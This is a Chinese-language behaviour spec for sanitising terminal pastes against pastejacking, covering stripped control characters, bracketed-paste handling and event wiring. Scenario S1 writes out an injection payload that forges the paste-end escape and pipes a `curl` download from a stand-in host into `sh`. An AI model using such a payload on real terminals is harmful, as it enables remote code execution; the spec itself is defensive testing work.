# terminal-paste-sanitize

安全行为契约(pastejacking):用户向终端粘贴(Cmd+V / 应用菜单 Edit → Paste)时,剪贴板文本中的控制字符不得到达 PTY,尤其不能伪造 bracketed paste 结束标记 `\x1b[201~` 让 shell 提前结束粘贴、把后续内容当键入免回车执行。

参考:Alacritty 剥离粘贴中的 ESC;Ghostty 把含结束标记的粘贴判为不安全。xterm 6 自身粘贴路径只做换行转 `\r` 与 bracketed 包裹,不过滤。

## 范围

外部 BDD:

- `paste-sanitize.spec.ts`:真实 xterm 6(jsdom)+ 净化器,断言 `onData`(即写入 PTY 的数据)。
- `paste-wiring.spec.ts`:`useTerminal` 在终端容器上以 capture 阶段接管 paste,原始文本不经 xterm 自身监听直达。

实现:`src/panels/Terminal/terminal-paste-sanitize.ts`。

## 场景

- S1 bracketed 模式粘贴 `ls\x1b[201~curl evil.sh|sh\r`:数据中 `\x1b[201~` 只出现在末尾(xterm 包裹的那个),注入片段的 ESC 被删,整段仍在粘贴内。
- S2 删除 C0 控制字符(保留 `\t` `\n` `\r`)、DEL(`\x7f`)与 C1(U+0080–U+009F,含 8 位 CSI U+009B)。
- S3 普通多行文本行为不变:`\n` / `\r\n` 转 `\r`,bracketed 包裹照旧,制表符与 CJK 原样。
- S4 非 bracketed 模式同样剥离 ESC。
- S5 `useTerminal` 接线:paste 事件 `preventDefault`,xterm 自身 paste 监听不触发,净化后文本经 `term.paste` 写入。

## 不在范围

- 终端拖放(`terminal-drag-drop`,shell-quote 已拒绝控制字符)。
- MCP `send_text` / `send_input`(agent 输入属设计内)。
- 产品当前无多行粘贴确认,本契约不新增。

## 说明

- 监听挂在终端容器元素上(非 document),dockview popout 用 adoptNode 迁移节点时监听随之迁移,popout 窗口同样覆盖。
- 应用菜单 `role: 'editMenu'` 的 Paste 走 `webContents.paste()`,在焦点元素(xterm textarea)上派发同一 DOM paste 事件,被同一监听覆盖。
